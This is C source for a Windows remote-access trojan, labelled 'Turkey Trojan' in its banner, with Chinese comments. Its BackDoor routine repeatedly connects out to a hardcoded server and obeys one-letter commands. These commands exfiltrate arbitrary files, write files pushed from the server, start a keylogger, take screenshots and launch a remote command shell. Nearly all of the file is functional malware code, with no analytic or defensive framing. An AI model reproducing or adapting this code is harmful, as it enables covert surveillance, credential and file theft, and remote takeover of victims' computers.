/* 
#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 
#include <WinSock2.h> 
  
#define PORT 8087 
#define PtrScnum "Please input the Ptrsc's number:\n"
#pragma comment(lib, "WS2_32") 
*/ 
#define SERVER_IP "127.0.0.1" 
#include "Trojan.h"
#define PORT 7777
#define BUFFER_SIZE 1024
#define FILE_NAME_MAX_SIZE 512

#define PTRSCSUC "PtrSc Success!\n"
#define PASSSUCCESS "Password success!\n"
#define PASSERROR "Password error!\n"
#define BYEBYE "Byebye!\n"
#define KEYSUC "KeyLog Success!\n"
#define Banner "-----------------------------Turkey Trojan--------------------------------\n"
#define CMDSUC "CMD SUCCESS !\n"

void sendFile(SOCKET m_New_Socket); 
void recvFile(SOCKET m_New_Socket); 
void BackDoor();//后门主函数 

void BackDoor()
{
  // 声明并初始化一个服务端(本地)的地址结构 
 // 初始化socket dll 
  WSADATA wsaData; 
  WORD socketVersion = MAKEWORD(2, 0); 
  if(WSAStartup(socketVersion, &wsaData) != 0) 
  { 
    printf("Init socket dll error!"); 
    exit(1); 
  } 
  
  //创建socket 
  SOCKET c_Socket = socket(AF_INET, SOCK_STREAM, 0); 
  if (SOCKET_ERROR == c_Socket) 
  { 
    printf("Create Socket Error!"); 
    system("pause"); 
    exit(1); 
  } 
  
  //指定服务端的地址 
  sockaddr_in server_addr; 
  server_addr.sin_family = AF_INET; 
  server_addr.sin_addr.S_un.S_addr = inet_addr(SERVER_IP); 
  server_addr.sin_port = htons(PORT); 
  WSADATA wsadata;
  int Retnum =0; //SOCKET返回值
  char buffer[5]; //接受BUFFER
  while(1)
  {
		Retnum = WSAStartup(MAKEWORD(2,2), &wsadata);
		SOCKET c_Socket = socket(AF_INET, SOCK_STREAM, 0); 
		Retnum = connect(c_Socket, (LPSOCKADDR)&server_addr, sizeof(server_addr));
		if (Retnum == SOCKET_ERROR ) 
		{ 
		    //printf("Can Not Connect To Server IP!\n"); 
			//system("pause"); 
			//exit(1); 
		}
		if(Retnum != SOCKET_ERROR)
		{		
				Retnum = send(c_Socket, Banner, sizeof(Banner), 0);
				memset(buffer, 0, 1); 
				recv(c_Socket, buffer, 5, 0);
				if(buffer[0]=='r'){
					sendFile(c_Socket);
				}
				else if(buffer[0] == 's'){
					recvFile(c_Socket);
				}
				else if(buffer[0] == 'e'){
					send(c_Socket, BYEBYE, sizeof(BYEBYE),0);
					closesocket(c_Socket); 
				//	goto Clean;
					return;
				}
				else if(buffer[0] == 'k'){								
					KeyLog(c_Socket);
					send(c_Socket, KEYSUC, sizeof(KEYSUC),0);
				}
				else if(buffer[0] == 'p'){	
					int num = 20;
					PtrSc(num);
					send(c_Socket, PTRSCSUC, sizeof(PTRSCSUC),0);
				}
				else if(buffer[0] == 'c'){
					 DWORD ThreadID = 0;
					 //printf("cccc\n");
					 CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)EXEBackMain, (LPVOID)c_Socket, 0, &ThreadID);  //CMD函数
					 //send(c_Socket, CMDSUC, sizeof(CMDSUC),0);
				}
		}
  }
  
    
  //释放winsock库 
  WSACleanup(); 
  
} 

void sendFile(SOCKET m_New_Socket){
	char buffer[BUFFER_SIZE]; 
	memset(buffer, 0, BUFFER_SIZE); 
    if (recv(m_New_Socket, buffer, BUFFER_SIZE, 0) < 0) 
    { 
//      printf("Server Receive Data Failed!"); 
	  return;
    } 
  
    char file_name[FILE_NAME_MAX_SIZE+1]; 
    memset(file_name, 0, FILE_NAME_MAX_SIZE+1); 
    strncpy(file_name, buffer, strlen(buffer)>FILE_NAME_MAX_SIZE ? FILE_NAME_MAX_SIZE:strlen(buffer)); 
//    printf("%s\n", file_name); 
  
    FILE * fp = fopen(file_name, "rb"); //windows下是"rb",表示打开一个只读的二进制文件 
    if (NULL == fp) 
    { 
//      printf("File: %s Not Found\n", file_name); 
	  return;
    } 
        else
    { 
      memset(buffer, 0, BUFFER_SIZE); 
      int length = 0; 
  
      while ((length = fread(buffer, sizeof(char), BUFFER_SIZE, fp)) > 0) 
      { 
        if (send(m_New_Socket, buffer, length, 0) < 0) 
        { 
//          printf("Send File: %s Failed\n", file_name); 
		  return;
        } 
        memset(buffer, 0, BUFFER_SIZE); 
      } 
  
      fclose(fp); 
//      printf("File: %s Transfer Successful!\n", file_name); 
    } 
	return;
}

void recvFile(SOCKET m_New_Socket){
	char buffer[BUFFER_SIZE]; 
	memset(buffer, 0, BUFFER_SIZE); 
	recv(m_New_Socket, buffer, BUFFER_SIZE, 0);
	char filename[FILE_NAME_MAX_SIZE+1]; 
    memset(filename, 0, FILE_NAME_MAX_SIZE+1); 
    strncpy(filename, buffer, strlen(buffer)>FILE_NAME_MAX_SIZE ? FILE_NAME_MAX_SIZE:strlen(buffer)); 
 //   printf("%s\n", filename); 
	FILE * fp = fopen(filename, "wb"); //windows下是"wb",表示打开一个只写的二进制文件 
  if(NULL == fp) 
  { 
//    printf("File: %s Can Not Open To Write\n", filename); 
    return;
  } 
  else
  { 
    memset(buffer, 0, BUFFER_SIZE); 
    int length = 0; 
    while ((length = recv(m_New_Socket, buffer, BUFFER_SIZE, 0)) > 0) 
    { 
      if (fwrite(buffer, sizeof(char), length, fp) < length) 
      { 
 //       printf("File: %s Write Failed\n", filename);
        break; 
      } 
      memset(buffer, 0, BUFFER_SIZE); 
    } 
	 fclose(fp); 
  
  }
  return;
}